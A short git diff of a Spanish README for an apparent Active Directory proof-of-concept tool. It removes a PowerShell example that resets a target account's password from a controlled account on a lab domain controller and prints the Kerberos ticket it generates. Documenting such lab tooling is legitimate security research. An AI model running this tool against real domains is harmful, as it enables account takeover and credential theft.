@@ -26,20 +26,6 @@ La sintaxis soportada por el cliente es:
     --execute
 ```
 
-Para imprimir también el ticket Kerberos generado:
-
-```powershell
-.\resetnightmare_rajkitpoc.exe `
-    --t rn-target `
-    --u rn-controlled `
-    --controlled-password <PASSWORD_CONTROLLED> `
-    --new-target-password <NEW_TARGET_PASSWORD> `
-    --d dc01.jellybeelab.local `
-    --e AES256 `
-    --execute `
-    --print-Ticket
-```
-
 | Parámetro | Descripción |
 |---|---|
 | `--t` | Cuenta objetivo |
